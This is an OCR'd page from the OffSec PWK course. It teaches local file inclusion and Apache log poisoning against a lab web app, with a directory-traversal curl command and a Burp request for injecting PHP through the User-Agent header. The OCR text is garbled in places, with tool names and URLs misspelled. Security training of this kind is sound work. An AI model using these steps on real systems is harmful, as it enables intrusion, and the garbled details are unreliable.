# OffSec Penetration Testing with Kali Linux

information before we send it to the web application. We can either read the Apache server³⁹⁹ documentation or display the file via LFI.

Let's use curl to analyze elements comprise a log by displaying the file access using the previously-found LFI vulnerability. This means we'll use the relative path of the log file in the "Mountain Desserts" web application.

```
kali@kali:~ $ curl
http://mountindesserts.com/meter/index.php?page=../../../../../../var/log/apache2_access.log

192.168.50.1 - [12/Apr/2022:10:34:55 +0000] "GET /index.php?page=admin.php
HTTP/1.1" 200 2218 - "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/2010101
Firefox/91.0"
..
```

Listing 140 - Log entry of Apache's access.log

Listing 140 shows the UserAgent⁴⁰ is in the log entry. When we send a request, we can modify the User Agent and specify what will be written to the access log.

Apart from the specified file, this command is equivalent to the directory traversal attack from our previous Learning. The exploitation of directory traversal and LFI vulnerabilities differs mainly when handling executables or content.

Let's start Burr, open the browser, and navigate to the "Mountain Desserts" web page. We will click on the Admin link to switch back to Burr and click on the HTTP history table. The list will reveal the command and send it to Rupert:

![](bbox=[0.253, 0.506, 0.447, 0.523])

```
Request
Get Hex 1/1
GET /meter/index.php?page=admin.php HTTP/1.1
Host: mountindesserts.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/2010101
Firefox/91.0
Accept: text/html,application/xml;q=0.9,image/webp/*;q=0.8
Accept-Language: en-US,q=0.5
Connection: close
Upgrade-Insecure-Requests: 1
10
```

Figure 128: Modified Request in Burr Repeat

We can now modify the User Agent to include the PHP code snippet of the following listing. This snippet attacks a command with the cmd parameter and executes it via the PHP system⁴⁰¹ on the target system. We'll use echo⁴⁰ to display command output.

+   ³⁹⁹ (Apache, 2022), https://docs.apache.org/docs/2/4/logs.html
⁴⁰ (Mozilla Developer Network, 2022), https://developer.mozilla.org/en-US/docs/Web/HTTP/User-Agent
⁴⁰¹ (PHP Manual, 2022), https://www.php.net/manual/en/function-system.php
⁴⁰² (PHP Manual, 2022), https://www.php.net/manual/en/function.echo.php

PWK - © 2023 OffSec Services Limited. All rights reserved. 259